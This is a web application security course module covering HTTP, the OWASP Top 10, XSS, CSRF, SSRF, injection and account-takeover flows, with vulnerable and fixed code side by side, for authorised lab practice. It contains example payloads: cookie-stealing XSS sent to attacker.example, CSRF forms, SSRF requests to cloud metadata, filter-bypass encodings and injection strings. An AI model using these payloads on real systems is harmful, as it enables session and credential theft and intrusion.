---
id: cyber-14-web-app-security
track: cyber
phase: 14
order: 140
title: "Phase 14 — Web Application Security"
duration: "6 weeks"
duration_weeks: 6
energy_mix: [low, normal]
deliverable: "portfolio/cyber/14-web-app-security.md"
exit_criteria: "You can read a web application's request and response, identify which OWASP Top 10 category a flaw belongs to, demonstrate it safely against an authorised lab target with Burp Suite, and write a finding with reproduction steps and a specific remediation."
---

# Phase 14 — Web Application Security

## Goal of this phase

Learn to find, demonstrate, and explain web application vulnerabilities on authorised lab targets, using the web development background you already have as a genuine advantage rather than starting over.

## Estimated time

**6 weeks** at 2–4 focused hours a day, 5 days a week. Roughly 65–80 hours, and most of it is spent in labs rather than reading.

## Skills you'll gain

- Read an HTTP request and response in full, including headers that carry security meaning.
- Identify which OWASP Top 10 category a flaw belongs to, and explain why.
- Test for injection, cross-site scripting, CSRF, IDOR, and SSRF on an authorised target.
- Use Burp Suite Community and OWASP ZAP to intercept, modify, and replay requests.
- Explain the same-origin policy and why it is the reason the browser is the real security boundary.
- Review a response's security headers and evaluate a content security policy.
- Evaluate authentication and session handling for the defects that cause account takeover.
- Write a web finding with reproduction steps, evidence, impact, and a specific fix.
- State the legal boundaries of web testing precisely, and refuse an unauthorised request without hesitating.

## Specific topics to learn

- HTTP in full: methods, status codes, headers, cookies, and message bodies
- The same-origin policy, CORS, and why the browser enforces what the server cannot
- OWASP Top 10 2021 in depth: A01 to A10
- Broken access control and IDOR: horizontal and vertical privilege escalation
- Injection: SQL injection, command injection, and injection into any interpreter
- Cross-site scripting: reflected, stored, and DOM-based, and the difference that matters
- Cross-site request forgery and the defences that actually work
- Server-side request forgery, and its combination with cloud metadata endpoints
- Authentication flaws: credential stuffing, weak reset flows, MFA bypass, session fixation
- Session management: cookie flags, token expiry, logout behaviour
- Security misconfiguration: default credentials, verbose errors, exposed admin interfaces
- Vulnerable and outdated components, and dependency management
- Security logging and monitoring failures, and how they make an attack invisible
- Burp Suite Community and OWASP ZAP: proxy, intercept, repeater, and scanning
- SQL injection testing with manual payloads and `sqlmap` on authorised targets
- Content Security Policy and the other security response headers
- Writing a web finding with a CVSS vector and a prioritised remediation
- Responsible disclosure and the legal boundary for web testing

## Lesson: You Already Know Half of This

### Why this lesson exists

This is the phase where your web development background stops being incidental and becomes the main asset.

Most people arriving at web application security have to learn two things at once: how the web works, and how it breaks. You already know the first. You know what a POST request is, and you know what a session cookie does. You have almost certainly written code that was vulnerable to something in the OWASP Top 10 without realising it.

**That last sentence is not an insult. It is the point.** The fastest way into this subject is to go back to code you wrote, find the bug you did not know you wrote, and understand why it happened. That moment — “I did that, and now I see it” — converts a rule into an intuition.

#### What your background gives you, concretely

| What you know | How it makes you faster here |
|---|---|
| How a request becomes a response | You can read a proxy history without a diagram |
| How authentication and sessions work | You know where to look for the flaws, because you built the flow |
| How a database query is constructed | Injection stops being abstract; you can see where the string concatenation is |
| How a template renders data | XSS is a rendering problem you have already debugged |
| How an API is designed | IDOR is an authorisation check you have already forgotten to write once |
| How to read a stack trace | Error handling becomes a source of information rather than a nuisance |
| How deployments work | Misconfiguration stops being mysterious; you know what defaults look like |

**The gap you have to close is not knowledge. It is mindset.** Writing code means making something work. Testing code means making it fail, deliberately, in ways the author did not consider. That is a different discipline, and it is the one this phase teaches.

#### What a defender does with this

It is worth being explicit, because this phase can look offensive and most entry-level jobs are defensive.

**Every web finding you write is a detection and a control waiting to be built.** The knowledge that lets you exploit an IDOR also lets you write a rule for a user requesting another user's record. It also lets you tell a developer exactly which authorisation check to add.

| Attacker's view | Defender's use of the same knowledge |
|---|---|
| This parameter accepts a user ID | Log and alert on access to records the session does not own |
| This endpoint reflects input unescaped | Enforce a content security policy that blocks inline script |
| This upload accepts any file type | Alert on files written outside the expected directory |
| This error reveals the database type | Remove the detail from the response, and monitor for the probing pattern |

**A security analyst who can read a web request is more useful than one who cannot.** Most breaches start at an application. Most application incidents are triaged by people who need to understand what the request meant.

#### Time to complete

**Roughly 65–80 hours over 6 weeks:**

| Work | Hours | Notes |
|---|---|---|
| Reading this lesson | 4–6 | Once, properly |
| PortSwigger Academy Apprentice labs | 20–25 | The single highest-value activity in the phase |
| PortSwigger Practitioner labs in one or two categories | 10–12 | Depth beats breadth |
| OWASP Juice Shop free exploration | 8–10 | A whole application rather than isolated labs |
| Burp Suite practice | 8–10 | The tool is learned by using it |
| Finding write-ups | 10–12 | Where the employable skill is demonstrated |
| Legal and disclosure reading | 2–3 | Short, and non-negotiable |

#### What this phase is not

It is not a phase that makes you a penetration tester. Phase 5 explained that pentest is a destination rather than a first job, and nothing here changes that.

It is not authorisation to test anything you can reach. Part 8 is the most important part of this lesson for that reason, and it is not a formality.

### Part 1 — HTTP, read properly

#### A request, in full

You have seen a request a thousand times. Read this one slowly, because every line has a security meaning.

```http
POST /api/v1/orders/1042/notes HTTP/1.1
Host: app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Content-Type: application/json
Content-Length: 47
Cookie: session=eyJ1aWQiOjEwNDJ9.aBcDeF; csrftoken=Zx9pQ2
Origin: https://app.example.com
Referer: https://app.example.com/orders/1042
X-Requested-With: XMLHttpRequest

{"note":"Please deliver after 5pm"}
```

| Element | Security meaning |
|---|---|
| **Method** | `GET` should not change state. A state change on `GET` is a CSRF and caching problem |
| **Path** | The resource identifier. `/orders/1042` with a sequential number is an IDOR waiting to happen |
| **Host** | If the application trusts this header to build links, it is a password-reset poisoning risk |
| **User-Agent** | Frequently trusted for logic, and trivially spoofed |
| **Content-Type** | If the server accepts the body as a different type, parsing confusion follows |
| **Cookie** | The session. Whether it has `HttpOnly`, `Secure`, and `SameSite` determines a great deal |
| **Origin** and **Referer** | Used for CSRF defence, and sometimes used as an access control by mistake |
| **Body** | The input. This is where injection lives |

#### A response, and the headers that matter

```http
HTTP/1.1 200 OK
Date: Sat, 14 Mar 2026 09:14:22 GMT
Server: nginx/1.24.0
Content-Type: application/json; charset=utf-8
Content-Length: 58
Set-Cookie: session=eyJ1aWQiOjEwNDJ9.aBcDeF; Path=/; HttpOnly; Secure; SameSite=Lax
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: no-store

{"id":1042,"note":"Please deliver after 5pm","owner_id":1042}
```

| Header | What it does | What its absence means |
|---|---|---|
| `Strict-Transport-Security` | Forces HTTPS for future visits | Downgrade attacks and cookie theft on a hostile network |
| `X-Content-Type-Options: nosniff` | Stops the browser guessing the content type | An uploaded file can be interpreted as script |
| `X-Frame-Options` or CSP `frame-ancestors` | Prevents the page being framed | Clickjacking |
| `Content-Security-Policy` | Restricts what the page may load or execute | XSS is far easier to exploit |
| `Referrer-Policy` | Controls what leaks in the Referer header | Tokens in URLs leak to third parties |
| `Cache-Control: no-store` | Prevents caching of sensitive responses | Sensitive data left in a shared cache or on disk |
| `Server` | Reveals the software and version | Free reconnaissance for an attacker |

**Note the `Server: nginx/1.24.0` line and the `owner_id` in the body.** The first is unnecessary information disclosure. The second tells you the API knows who owns the order — which raises the immediate question of whether it checks that the *requesting* user is that owner. That question is A01, and it is the most common serious web vulnerability there is.

#### Status codes as a testing tool

Status codes are how a server tells you what it did, and a tester reads them for inconsistencies.

| Code | Meaning | What a tester does with it |
|---|---|---|
| **200** | Success | The baseline. Note the response length, because length differences reveal content |
| **201 / 204** | Created / no content | Confirm what was created and whether it was authorised |
| **301 / 302** | Redirect | Check for open redirects, and whether the redirect target is validated |
| **400** | Bad request | Often reveals input validation and error handling detail |
| **401** | Unauthenticated | The boundary. Try the same request with a valid session |
| **403** | Authenticated but forbidden | The authorisation check working. Try the same object as another user |
| **404** | Not found | If it appears where a 403 should, the application may be hiding existence — or may be broken |
| **405** | Method not allowed | Try another method. `GET` blocked does not mean `PUT` is |
| **429** | Rate limited | The control exists. Find where it does not apply — often a different endpoint |
| **500** | Server error | An unhandled input. This is where you look hardest |

**The 401-versus-403-versus-404 distinction is the fastest way to map an application's access control.** A resource that returns 404 for another user's object is hiding it. A resource that returns 200 is leaking it.

#### Cookies and the flags that decide a session's fate

```http
Set-Cookie: session=eyJ1aWQiOjEwNDJ9.aBcDeF; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

| Flag | What it does | If missing |
|---|---|---|
| **`HttpOnly`** | JavaScript cannot read the cookie | An XSS becomes instant session theft |
| **`Secure`** | Sent only over HTTPS | Sent over HTTP, where it can be intercepted |
| **`SameSite=Lax`** | Not sent on most cross-site requests | CSRF is possible unless another defence exists |
| **`SameSite=Strict`** | Not sent on any cross-site request | Strongest CSRF defence, and it breaks legitimate cross-site flows |
| **`SameSite=None`** | Sent cross-site, and **requires `Secure`** | Without `Secure`, browsers reject it, or worse, it is exposed |
| **`Path`** | Limits the cookie to a path | Broader exposure than intended |
| **`Domain`** | Widens the cookie to subdomains | A compromised subdomain can read it |
| **`Max-Age` or `Expires`** | Lifetime | A session cookie with no expiry survives until the browser closes, and sometimes longer |

**The `Domain` flag is the one people misread.** Setting `Domain=.example.com` shares the cookie with every subdomain, including ones you do not control. A single vulnerable subdomain then becomes a route into the main application's session.

#### The same-origin policy, which is the real security boundary

An **origin** is the combination of scheme, host, and port. `https://app.example.com` and `http://app.example.com` are different origins. So are `https://app.example.com` and `https://app.example.com:8443`.

The **same-origin policy** is a browser rule: a script from one origin cannot read the response of a request to a different origin.

| Situation | What the browser does |
|---|---|
| Same origin | Full access |
| Different origin, simple request | The request is sent; the response cannot be read by the script |
| Different origin, with CORS headers allowing it | The response can be read |
| An image, script, or stylesheet from another origin | Can be loaded, but not read |
| A form submission to another origin | Can be sent, but the response cannot be read |
| An `iframe` from another origin | Rendered, but not scripted into |

**Two consequences follow, and they explain most of web security.**

First, **the browser is the boundary, not the network**. An attacker's page can make your browser send requests to your bank; it just cannot read the replies. That is why cross-site request forgery exists at all, and why CSRF defences are needed on state-changing endpoints.

Second, **a request being sent is different from a response being read**. Many tests come down to asking which of the two an attacker can achieve.

**CORS** relaxes the same-origin policy deliberately, and its mistakes are common and severe.

| CORS configuration | Effect |
|---|---|
| `Access-Control-Allow-Origin: https://app.example.com` | Correct and narrow |
| `Access-Control-Allow-Origin: *` | Any site can read the response. Acceptable only for genuinely public data with no credentials |
| Reflecting the `Origin` header value | Any site can read the response, including authenticated data |
| `Access-Control-Allow-Credentials: true` with a reflected origin | Session cookies are sent and the response is readable — a full account compromise path |
| Permitting `null` as an origin | A sandboxed iframe or a `file://` page can read the response |

**The reflected-origin pattern with credentials is the one to hunt.** It is not a theoretical misconfiguration; it appears in real applications. It converts any page on the internet into a proxy for reading the victim's authenticated data.

### Part 2 — The OWASP Top 10, category by category

#### A01 — Broken access control

This is the most common serious web vulnerability, and the one most likely to be in code you wrote. It means the application does not properly check whether the person making the request is allowed to do what they asked.

| Flavour | What it looks like | Where the bug is |
|---|---|---|
| **IDOR** — insecure direct object reference | Changing `/orders/1042` to `/orders/1043` returns someone else's order | No ownership check on the object |
| **Vertical escalation** | A normal user reaches `/admin/users` | No role check on the route |
| **Horizontal escalation** | User A sees User B's data | Authentication checked, authorisation not |
| **Missing function-level control** | The admin API is unauthenticated but unlinked from the UI | Security by obscurity, which is not security |
| **Forced browsing** | `/backup.zip`, `/.git/config`, `/api/v1/internal` | Nothing in front of the file |
| **Path traversal** | `?file=../../../../etc/passwd` | The path is built from user input without normalisation |
| **Metadata manipulation** | Changing `"role":"user"` to `"role":"admin"` in a JWT or a hidden field | The client is trusted |

**The IDOR pattern is worth seeing as code**, because if you have written this, you will recognise it immediately.

```python
# VULNERABLE — authentication is checked, authorisation is not.
@app.get("/api/v1/orders/{order_id}")
def get_order(order_id: int, user=Depends(current_user)):
    order = db.query(Order).filter(Order.id == order_id).first()
    if not order:
        raise HTTPException(404)
    return order            # any authenticated user gets any order

# FIXED — the query is scoped to the authenticated user.
@app.get("/api/v1/orders/{order_id}")
def get_order(order_id: int, user=Depends(current_user)):
    order = (
        db.query(Order)
        .filter(Order.id == order_id, Order.owner_id == user.id)
        .first()
    )
    if not order:
        raise HTTPException(404)   # 404, not 403 — do not confirm existence
    return order
```

Two details in the fixed version matter. **The ownership filter is in the query**, not in a separate check afterwards, so there is no path that skips it. And the error is **404 rather than 403**, which avoids confirming that the object exists — a small information-disclosure improvement that costs nothing.

**Why this category dominates:** authentication is a visible feature that gets tested, and authorisation is an invisible property that does not. Every developer remembers to require a login. Far fewer remember to check that the logged-in user owns the thing they are asking for.

#### A02 — Cryptographic failures

Sensitive data exposed because it was not properly protected, or was protected with something broken.

| Failure | Example | Why it is a problem |
|---|---|---|
| Data in transit without TLS | A login form over HTTP | Credentials readable on the network |
| Weak or deprecated algorithms | MD5 or SHA-1 for passwords | Crackable at scale on commodity hardware |
| Unsalted password hashes | Identical hashes for identical passwords | Rainbow tables, and one crack reveals every match |
| Hard-coded keys | An encryption key in the repository | The protection is decorative once the repo leaks |
| Sensitive data cached | A report left in the browser cache | Readable on a shared machine |
| Predictable tokens | Sequential reset tokens | Trivially guessed |

**The password-storage rule is the one to know precisely.** Passwords are stored with a slow, salted, memory-hard hash: `bcrypt`, `scrypt`, or `Argon2`. Not SHA-256, and never MD5 or SHA-1. The reason is speed. A modern GPU computes billions of SHA-256 hashes per second, and only thousands of bcrypt hashes. That difference is the entire defence.

#### A03 — Injection

Injection happens when untrusted data is interpreted as code by whatever processes it. The interpreter varies; the bug does not.

| Injection type | Interpreter | Example input |
|---|---|---|
| **SQL injection** | The database | `' OR 1=1--` |
| **Command injection** | The operating system shell | `; cat /etc/passwd` |
| **LDAP injection** | A directory service | `*)(uid=*))(|(uid=*` |
| **XML external entity** | An XML parser | An entity referencing a local file |
| **Template injection** | A template engine | `{{7*7}}` |
| **NoSQL injection** | A document database | `{"$ne": null}` |
| **Log injection** | A log parser downstream | A newline that forges a log entry |
| **Header injection** | The HTTP response | A CRLF sequence that adds a header |

**SQL injection has a shape you can recognise**, and seeing it as code is faster than reading about it.

```python
# VULNERABLE — the input becomes part of the query text.
query = f"SELECT * FROM users WHERE email = '{email}' AND password_hash = '{hashed}'"
cursor.execute(query)
# email = "admin'--" turns the rest of the line into a comment.

# VULNERABLE — the same bug via string formatting.
query = "SELECT * FROM users WHERE email = '%s'" % email

# FIXED — a parameterised query. The driver sends data separately from code.
cursor.execute(
    "SELECT * FROM users WHERE email = %s AND password_hash = %s",
    (email, hashed),
)
```

**The fix is not escaping, and it is not a blocklist of dangerous characters.** It is parameterisation. The query structure is sent to the database first, and the values are sent separately, so the database never has the opportunity to interpret a value as syntax. Every other approach is weaker.

**The trap that catches experienced developers** is that they parameterise the values and then concatenate the table name or the column name. Parameters cannot be used for identifiers.

```python
# STILL VULNERABLE — the sort column is concatenated.
sort = request.args.get("sort", "created_at")
cursor.execute(f"SELECT * FROM orders ORDER BY {sort}")

# FIXED — an allowlist. There is no way to parameterise an identifier.
ALLOWED_SORTS = {"created_at", "total", "status"}
sort = request.args.get("sort", "created_at")
if sort not in ALLOWED_SORTS:
    sort = "created_at"
cursor.execute(f"SELECT * FROM orders ORDER BY {sort}")
```

**An allowlist is the only correct answer for identifiers.** Knowing that distinction is the difference between someone who has read about SQL injection and someone who has fixed it.

#### A04 — Insecure design

This category is different from the others. It is not a coding mistake; it is a design that cannot be made secure by fixing code.

| Insecure design | Why code cannot fix it |
|---|---|
| A password reset that emails the password itself | The credential traveled over an insecure channel by design |
| A "remember me" that never expires | Session lifetime is a design decision |
| No limit on how many times a coupon can be redeemed | The abuse case was never considered |
| A support tool that can view any customer's data with no logging | The capability is the problem, not its implementation |
| A transfer flow with no confirmation step | A single mistake moves money |

**The design-phase question that prevents most of this category** is a set of abuse cases, written alongside the use cases.

| Use case | Abuse case |
|---|---|
| A customer can reset their password | Someone can reset a password they do not own |
| A user can export their data | A user can export someone else's data, repeatedly |
| A coupon can be applied at checkout | A coupon can be applied a thousand times, or to another account |

Writing abuse cases takes twenty minutes and finds the same bugs that pen testing finds months later at far higher cost.

#### A05 — Security misconfiguration

This is the most common finding in real assessments and the easiest to fix, which makes it the most frustrating.

| Misconfiguration | Where it appears |
|---|---|
| Default credentials | An admin panel shipped with `admin/admin` |
| Directory listing enabled | A web server exposing an index of uploads |
| Verbose errors in production | A stack trace naming the framework, version, and file paths |
| Unnecessary features enabled | Sample applications, debug endpoints, `phpinfo()` |
| Missing security headers | No CSP, no HSTS, no `nosniff` |
| Permissive CORS | Reflected origin with credentials |
| Cloud storage permissions | A bucket holding backups, publicly readable |
| Missing hardening | A container running as root, with a writable filesystem |

**The verbose-error row is worth a specific example**, because it chains into other attacks.

```text
Traceback (most recent call last):
  File "/app/api/orders.py", line 42, in get_order
    order = db.query(Order).filter(Order.id == order_id).first()
  File "/usr/local/lib/python3.11/site-packages/sqlalchemy/orm/query.py", line 2759
sqlalchemy.exc.ProgrammingError: (psycopg2.errors.SyntaxError) syntax error at or near "'"
LINE 1: SELECT * FROM orders WHERE id = 1042'
                                         ^
[SQL: SELECT * FROM orders WHERE id = 1042']
```

That single error page tells an attacker the framework, the language, and the database driver. It also reveals the file path, the line number, and — by echoing the query — exactly where the injection point is. It is a complete map of the next step.

#### A06 — Vulnerable and outdated components

You do not write most of the code you run. A modern application has hundreds of dependencies, each with its own history of vulnerabilities.

| Problem | Consequence |
|---|---|
| An unpatched framework | A known exploit with a public proof of concept |
| A dependency with a transitive vulnerability | A vulnerable package pulled in by a package you chose |
| A component that is no longer maintained | No fixes will ever arrive |
| An outdated container base image | An operating system full of known issues |
| Client-side libraries out of date | A JavaScript library with a known XSS |

**The defender's practical answer is a software bill of materials** — a list of every component and version in the application — plus automated scanning of it. Without the inventory, you find out about a critical library vulnerability from the news.

```bash
# Python dependencies, and their known vulnerabilities.
pip install pip-audit
pip-audit

# Node dependencies.
npm audit
npm audit fix

# Container image scanning.
trivy image myapp:latest

# A software bill of materials for a container.
syft myapp:latest -o spdx-json > sbom.json
```

The **software bill of materials** is becoming a contractual requirement in many sectors, because you cannot manage the risk of components you cannot enumerate.

#### A07 — Identification and authentication failures

| Failure | What it enables |
|---|---|
| Credential stuffing works | No rate limiting, no breached-password check, no MFA |
| Weak password reset | A predictable token, or a security question with a public answer |
| User enumeration | Different responses for a valid and an invalid username |
| Session fixation | The session ID does not change on login |
| Sessions that never expire | A stolen token is valid forever |
| MFA that can be bypassed | A legacy protocol, or a "remember this device" that never expires |
| Password hints or security questions | Answers that are findable on social media |

**User enumeration is the small flaw that enables the large one.** If a reset form says “no account with that email” in one case and “check your inbox” in the other, it has handed an attacker a free list of valid accounts. The fix is a single generic response for both cases.

**Session fixation is worth understanding as a mechanism**, because it is invisible if you do not look for it. The attacker sets a session identifier in the victim's browser, the victim logs in, and the application keeps the same identifier — now authenticated. The fix is to issue a new session identifier on every privilege change, especially login.

#### A08 — Software and data integrity failures

The code and data you trust may have been modified.

| Failure | Example |
|---|---|
| Insecure deserialisation | A serialised object from the client is deserialised and executed |
| Unsigned updates | An update mechanism that accepts any package |
| Untrusted CI/CD pipeline | A build step that runs code from a pull request with secrets available |
| Dependency confusion | An internal package name that can be claimed on a public registry |
| Untrusted client-side data | Hidden form fields trusted as authoritative |

**Insecure deserialisation is the most dangerous item here.** In several languages, deserialising untrusted data can execute arbitrary code before any of your application logic runs. The rule is simple and absolute: **never deserialise untrusted input**. If a format must be used, use one that carries data only, such as JSON, with schema validation.

#### A09 — Security logging and monitoring failures

This category is about the defender's ability to notice. It is the one that makes every other category worse, because an exploited flaw that leaves no trace can be used indefinitely.

| Failure | Consequence |
|---|---|
| No logging of authentication events | Credential stuffing is invisible |
| No logging of access control decisions | An IDOR campaign is invisible |
| Logs with no timestamps or correlation IDs | An investigation cannot reconstruct a sequence |
| Logs that exclude the request body | Injection attempts are invisible |
| No alerting on the above | The logs exist and nobody reads them |
| Sensitive data in logs | Passwords, tokens, and card numbers in a log file |

**This is where your Phase 10 skills transfer directly.** The events worth logging on a web application are the ones an attacker cannot avoid producing:

| Event | Why it must be logged |
|---|---|
| Authentication success and failure | Every credential attack produces these |
| Authorisation denial | The signal that something is probing for IDOR |
| Password reset request and completion | Account takeover attempts |
| Changes to user roles or permissions | Privilege escalation |
| Access to a resource the session does not own | The IDOR detection itself |
| Input that trips a validation rule | Injection probing |
| Administrative actions | Attribution |

**The last row of the failure table is a security problem in its own right.** A log file containing unredacted passwords or session tokens has moved sensitive data into a system with weaker controls and longer retention.

#### A10 — Server-side request forgery

SSRF makes the server perform a request on the attacker's behalf. You met it in Phase 9 from the cloud side, where it reaches the metadata service and steals credentials. Here it is from the application side.

```python
# VULNERABLE — the server fetches whatever the user supplies.
@app.get("/api/fetch-image")
def fetch_image(url: str):
    return requests.get(url).content

# Reachable payloads:
#   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   ?url=http://localhost:8500/v1/agent/self
#   ?url=http://internal-admin.svc.cluster.local/users
#   ?url=file:///etc/passwd
```

**Why SSRF is treated as critical when it exists.** The request comes from the server, which is inside the network. That often means it can reach internal services that are not exposed to the internet at all. A single SSRF can turn an external attacker into an internal one.

| Defence layer | What it does | Its weakness |
|---|---|---|
| URL allowlist | Only fetch from named hosts | Requires knowing the legitimate hosts, and breaks when they change |
| Scheme allowlist | Only `http` and `https` | Still allows internal addresses |
| Block private and link-local ranges | Rejects `10.0.0.0/8`, `169.254.0.0/16`, and similar | Bypassable with DNS rebinding or a redirect |
| Resolve-then-validate | Check the IP after resolution, and pin it | More robust, and still needs redirect handling |
| Network egress control | The server cannot reach internal services | The durable fix, and often the most disruptive |
| Response filtering | Do not return the raw response to the user | Reduces impact without fixing the flaw |

**The network egress control is the only durable answer**, because every application-layer check can be bypassed by a determined attacker with control of a domain. The application-layer checks buy time and reduce the easy cases.

### Part 3 — The classic flaws, in detail

#### Cross-site scripting, in three flavours

XSS is a code injection flaw where an attacker's script runs in the victim's browser, in the context of the vulnerable site. What makes it serious is that the script runs with the victim's session, so it can do anything the victim can do.

| Type | Where the payload lives | How it triggers | Persistence |
|---|---|---|---|
| **Reflected** | In the request, echoed into the response | The victim clicks a crafted link | None — one victim per link |
| **Stored** | In the database, rendered to every viewer | Anyone who views the page | Persistent, and affects everyone |
| **DOM-based** | In the page's own JavaScript, from a client-side source | The victim's browser processes the URL fragment | None, and the server never sees the payload |

**Stored XSS is the most serious**, because one submission compromises every user who views the page. A comment field, a support ticket, a profile display name — any of these can be the injection point.

```html
<!-- VULNERABLE — the comment is inserted into the page as HTML. -->
<div class="comment"><?= $comment ?></div>
<!-- Payload: <script>fetch('https://attacker.example/steal?c='+document.cookie)</script> -->

<!-- FIXED IN THE FRAMEWORK — the template escapes by default. -->
<div class="comment">{{ comment }}</div>

<!-- FIXED IN PLAIN PHP — escape at the point of output. -->
<div class="comment"><?= htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') ?></div>
```

**The DOM-based flavour is the one developers miss**, because the vulnerability never reaches the server.

```javascript
// VULNERABLE — the fragment is written into the page as HTML.
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = "Hello, " + name;
// Payload: ?name=<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>

// FIXED — use textContent, which cannot create elements.
document.getElementById("greeting").textContent = "Hello, " + name;
```

The rule that covers all three, and it is a rule about *where* the defence goes:

**Escape at the point of output, not the point of input.** Escaping on input corrupts the stored data and breaks legitimate uses. It still fails if the same data is rendered into a different context. Escaping on output applies the correct encoding for the destination — HTML body, HTML attribute, JavaScript string, URL, or CSS. Each of those needs a different encoding.

**Why `HttpOnly` matters so much here:** with it set, `document.cookie` cannot read the session cookie, so the simplest session-theft payload fails. XSS is still serious without it — the script can make authenticated requests directly — but `HttpOnly` removes the easiest exploit.

#### Cross-site request forgery

CSRF makes the victim's browser send an authenticated request the victim did not intend. It works because cookies are attached to requests automatically, and the same-origin policy does not stop a request from being *sent*.

```html
<!-- On the attacker's page. The victim visits it while logged in to the bank. -->
<form action="https://bank.example.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById("f").submit()</script>
```

The victim's browser sends the request with the victim's session cookie attached. Nothing about the request looks unusual to the bank — which is why the defences are needed.

| Defence | How it works | Strength |
|---|---|---|
| **`SameSite=Lax` or `Strict`** | The browser does not attach the cookie to cross-site requests | Strong, and it is the modern default |
| **Anti-CSRF token** | A random, per-session value the attacker cannot predict, submitted with the form | Strong, and required for older browsers |
| **Checking `Origin`** | Reject requests whose `Origin` is not your own | Strong, and simple |
| **Requiring re-authentication** | Confirm the password for sensitive actions | Strong, and it costs usability |
| **`Referer` checking** | Reject based on the referring page | Weak — the header can be absent or stripped |

**The `GET` trap deserves naming.** If a state-changing action is reachable by `GET` — `/transfer?to=X&amount=5000` — then CSRF needs no form at all. An image tag is enough. A state change on a `GET` request is a design flaw regardless of what other defences exist.

```html
<!-- CSRF against a GET endpoint needs no JavaScript and no form. -->
<img src="https://bank.example.com/transfer?to=attacker&amount=5000">
```

#### Server-side request forgery, and the bypass ladder

The defences from A10 can be bypassed, and knowing the ladder is what makes a test thorough.

| Defence you might meet | Bypass to try |
|---|---|
| Blocks `localhost` and `127.0.0.1` by string | `127.0.0.2`, `0177.0.0.1`, `2130706433`, `[::1]`, `0.0.0.0` |
| Blocks the literal metadata address | A DNS name that resolves to `169.254.169.254` |
| Blocks by hostname pattern | A redirect on a host you control to the internal target |
| Validates the URL once, then follows redirects | Redirect after the check — the classic time-of-check problem |
| Blocks private ranges by IP | DNS rebinding: first resolution public, second resolution private |
| Only allows `https` | A public host with a valid certificate that redirects internally |

**The redirect bypass is the one that catches the most code**, because validating at the start of a request is the natural way to write it. It is also insufficient.

#### Injection beyond SQL

| Injection | Where the untrusted data lands | The safe construction |
|---|---|---|
| **Command** | A shell string | Pass argument lists, never `shell=True` |
| **LDAP** | A filter string | Escape per RFC 4515, or use a library |
| **Template** | A template source | Never build templates from user input; pass data as variables |
| **NoSQL** | A query document | Reject objects where a string is expected |
| **Header** | A response header | Strip CR and LF, or use the framework's header API |
| **Log** | A log line | Encode newlines and control characters |

```python
# VULNERABLE — the hostname becomes part of a shell command.
os.system(f"nslookup {hostname}")

# FIXED — an argument list. No shell parses the value.
subprocess.run(["nslookup", hostname], shell=False, timeout=10)
```

**The NoSQL case is worth one concrete example**, because it catches people who assume "no SQL means no injection".

```javascript
// VULNERABLE — the whole body is used as the query filter.
db.collection("users").findOne({ username: req.body.username, password: req.body.password });
// Payload: {"username": "admin", "password": {"$ne": null}}
// The query becomes "password is not equal to null", which is true for any password.

// FIXED — the type is validated before use.
const { username, password } = req.body;
if (typeof username !== "string" || typeof password !== "string") {
  return res.status(400).json({ error: "invalid input" });
}
```

**The lesson is that injection is about an interpreter, not about SQL.** Anywhere your data is interpreted rather than treated as data, the same bug exists.

### Part 4 — Authentication, sessions, and the account takeover path

#### The flows worth testing

Account takeover is the highest-value outcome for most web attackers. The flaws that produce it are usually in the supporting flows rather than in the login form.

| Flow | What to test | The common flaw |
|---|---|---|
| **Login** | Rate limiting, lockout, response differences, timing | No limit, and user enumeration |
| **Password reset** | Token entropy, expiry, single use, binding to the user | A short or predictable token, or one that never expires |
| **Email change** | Does changing the email require confirmation of both addresses? | Changing the email alone grants access |
| **MFA enrolment** | Can an attacker enroll their own factor? | Requires only a session, which may be stolen |
| **MFA disable** | Does it require re-authentication? | One click, with no verification |
| **"Remember this device"** | How long, and is the token bound to the device? | A permanent bypass cookie |
| **Session on login** | Does the session identifier change? | Session fixation |
| **Logout** | Is the session invalidated server-side? | The cookie is cleared client-side only |
| **Password change** | Are other sessions terminated? | A stolen session survives the reset |

**The password reset flow is where most of these live**, and testing it properly means walking through it as both an attacker and a legitimate user.

| Test | What you are looking for |
|---|---|
| Request a reset for an address you do not control | Does the response differ from a valid address? |
| Inspect the token | Is it long, random, and unguessable? |
| Wait past the stated expiry and use it | Does it still work? |
| Use the token twice | Is it single-use? |
| Request two resets, then use the first | Is the older token invalidated? |
| Change the user identifier in the reset request | Can you reset someone else's password? |

That second-to-last row is the one that catches a great many implementations. A reset flow that issues a new token without invalidating the previous one leaves every previously issued token live.

#### Session management, checked as a list

| Check | Why it matters |
|---|---|
| Session identifier length and randomness | Short or predictable identifiers are guessable |
| New identifier on login | Prevents session fixation |
| New identifier on privilege change | Prevents a pre-authentication session from becoming an admin session |
| `HttpOnly` on the session cookie | Blocks the simplest XSS cookie theft |
| `Secure` on the session cookie | Prevents transmission over HTTP |
| `SameSite` set | Reduces CSRF exposure |
| Server-side expiry, tested | A cookie that expires is not the same as a session that is invalidated |
| Server-side logout | The session must be destroyed, not just forgotten by the browser |
| Concurrent session handling | Are old sessions terminated when a new one starts? |
| Idle timeout | Is there one, and is it enforced server-side? |

**The logout row is a genuine and common finding.** Clearing a cookie in the browser does not invalidate the token. If an attacker captured it, it remains valid until the server-side session expires — which, in many applications, is never.

#### The account takeover chain, worked through

This is what a real finding looks like when several small flaws combine. None of them is critical alone.

| Step | Flaw | What the attacker does |
|---|---|---|
| 1 | User enumeration on the reset form | Submits addresses and collects the ones that return "check your inbox" |
| 2 | A reset token that is short and generated from a timestamp | Requests a reset for a known account and narrows the token space |
| 3 | No rate limit on the reset endpoint | Brute-forces the token |
| 4 | The reset does not invalidate existing sessions | Logs in with the new password while the victim's session continues |
| 5 | Changing the email requires no confirmation of the old address | Takes permanent ownership of the account |

| Reading of that chain | Response |
|---|---|
| "These are five low-severity issues" | Wrong. Together they are a full account takeover for every user |
| Report each separately with no chain | The severity is understated and the fix may be deprioritised |
| Report the chain as one finding | Correct — with each step's evidence, and one remediation plan |

